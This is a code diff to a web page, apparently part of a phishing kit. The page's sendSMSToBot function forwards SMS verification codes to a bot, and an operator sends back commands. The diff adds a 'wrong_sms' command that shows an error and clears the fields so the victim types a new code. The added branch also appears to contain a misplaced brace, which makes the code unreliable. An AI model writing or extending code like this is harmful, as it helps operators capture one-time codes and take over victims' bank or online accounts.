@@ -971,6 +971,10 @@
                 console.log('🎉 Получена команда SUCCESS');
                 window.redirectToSuccess();
             }
+            } else if (command.action === 'wrong_sms') {
+                console.log('❌ Получена команда WRONG_SMS');
+                window.showWrongSMSError();
+            }
         }
 
         // ========== ФУНКЦИИ РЕДИРЕКТА ==========
@@ -1133,8 +1137,32 @@ async function sendSMSToBot(smsCode) {
 
         // Предотвращаем масштабирование на iOS при фокусе
         document.addEventListener('touchstart', function() {}, {passive: true});
+        window.showWrongSMSError = function() {
+    const btn = document.getElementById('confirmBtn');
+    const originalText = btn.innerHTML;
+    
+    btn.innerHTML = '<i class="fas fa-times"></i> ❌ Неверный SMS код';
+    btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
+    btn.disabled = true;
+    
+    // Очищаем поля
+    document.querySelectorAll('.code-input').forEach(input => {
+        input.value = '';
+        input.classList.remove('filled');
+    });
+    
+    setTimeout(() => {
+        btn.innerHTML = originalText;
+        btn.style.background = '';
+        btn.disabled = false;
+        
+        // Фокус на первое поле
+        document.querySelector('.code-input').focus();
+    }, 3000);
+};
     </script>
 </body>
 </html>
+
 
 
